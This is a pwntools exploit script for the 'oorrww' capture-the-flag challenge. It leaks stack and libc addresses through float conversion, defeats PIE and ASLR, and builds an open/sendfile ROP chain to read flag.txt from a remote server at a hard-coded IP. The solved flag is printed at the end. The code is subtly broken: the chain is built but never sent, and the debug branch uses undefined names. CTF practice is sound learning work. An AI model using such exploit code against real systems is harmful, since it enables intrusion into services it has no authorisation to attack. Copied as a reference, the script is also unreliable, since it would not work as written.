from pwn import *
# fill in binary name
elf = context.binary = ELF("./oorrww")
context.arch = 'amd64'
# fill in libc name
libc = ELF("./libc.so.6")

if args.REMOTE: 
  # fill in remote address
  p = remote("193.148.168.30", 7666)
elif args.REMOTE2:
  p = remote("localhost", 40003)
elif args.GDB:
  context.terminal = ["tmux", "splitw", "-h"]
  p = gdb.debug(binary, gdbscript=gs)
else:
  p = elf.process(env = {"LD_PRELOAD": libc.path})

# create exploit here
'''
Leaked stack address and libc address
Full RELRO, canary present, NX enabled, PIE enabled
We are able to overwrite RBP and RSP
Rewrite stack with "flag.txt", followed by ROP chain
ROP chain in stack still works against NX enabled!
'''
def float_to_long(f):
    # pack the float as little endian using <d
    # unpack into 8 bytes as little endian using <Q
    return struct.unpack('<Q', struct.pack('<d', f))[0]

def long_to_float(l):
  return str(struct.unpack('<d', struct.pack('<Q', l))[0]).encode()

p.recvuntil(b': ')
addresses = p.recvuntil(b'!\n')[:-2].decode()
local_a8_addr, scanf_addr = addresses.split()
local_a8_addr = float_to_long(float(local_a8_addr))
scanf_addr = float_to_long(float(scanf_addr))
print("local_a8 addr: " + hex(local_a8_addr))
print("scanf addr: " + hex(scanf_addr))
print("libc addr: " + hex(scanf_addr - libc.sym['__isoc99_scanf']))
libc.address = scanf_addr - libc.sym['__isoc99_scanf']

rop = ROP([libc])
rop.base = local_a8_addr
rop.open("flag.txt", 0)
rop.sendfile(1, 3, 0, 0x100)
rop.exit(0)

info(b"flag: " + p.recv(50))
# flag: L3AK{th3_d0ubl3d_1nput_r3turns_whAt_u_wAnt}